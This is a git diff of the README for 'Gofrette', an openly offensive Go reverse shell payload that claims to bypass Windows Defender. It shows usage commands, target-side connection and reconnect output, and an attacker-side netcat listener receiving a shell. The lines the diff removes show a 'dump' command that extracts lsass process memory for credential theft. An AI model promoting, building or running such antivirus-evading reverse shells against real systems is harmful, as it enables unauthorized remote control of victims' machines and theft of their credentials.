@@ -7,10 +7,8 @@
 
 # Gofrette
 
-Gofrette is a reverse shell payload developed in Golang that bypasses Windows defender and many others anti-virus.
-<p align="center">
-  <a href="" rel="noopener">
- <img src="https://antiscan.me/images/result/aB0uZL38cghZ.png"> </a>
+Gofrette is a reverse shell payload developed in Golang that bypasses Windows defender (18.2.2022). It also supports network cuts.  
+
 
 
 ## Releases
@@ -20,29 +18,32 @@ https://github.com/Enelg52/Gofrette/releases
 
 ```bash
 .\gofrette.exe -a [ipadress] -p [port]
+
+.\127.0.0.1_1234.exe
 ```
 
 ## Example
-````raw
-//target
-PS C:\Users\enelg> go run .\gofrette.go -a 127.0.0.1 -p 1234
-Connected... :)
-````
-
+#### Target :
 ```raw
-//attacker
+PS C:\Users\enelg> go run .\gofrette.exe -a 127.0.0.1 -p 1234
+[-] Trying to connect to 127.0.0.1:1234
+[+] Connected... :)
+[-] Closed... :(
+[-] Lost connection
+[*] Trying to reconnect
+[+] Connected... :)
+```
+```
+PS C:\Users\enelg> .\127.0.0.1_1234
+[-] Trying to connect to 127.0.0.1:1234
+[+] Connected... :)
+```
+#### Attacker :
+```raw
 ❯ rlwrap nc -lvnp 1234
 Listening on 0.0.0.0 1234
 Connection received on 127.0.0.1 37458
-C:\Users\enelg>help
-exit : exit terminal
-dump : dump lsass in /tmp
-C:\Users\enelg>dump
-[+] Get process id
-[+] Dump process 900
-[+] Process dumped
-[+] The dump is under C:\temp\lsass.dmp
-C:\Users\yanng>
+C:\Users\enelg>
 ```
 
 
